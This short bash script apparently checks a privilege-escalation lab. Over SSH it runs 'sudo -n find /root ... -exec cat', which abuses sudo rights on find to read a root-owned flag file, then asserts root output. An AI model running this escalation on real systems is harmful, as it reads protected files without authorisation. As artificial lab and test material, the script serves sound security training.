#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -n /usr/bin/find /root -name flag.txt -exec cat {} \;')"
assert_root_output "${out}"
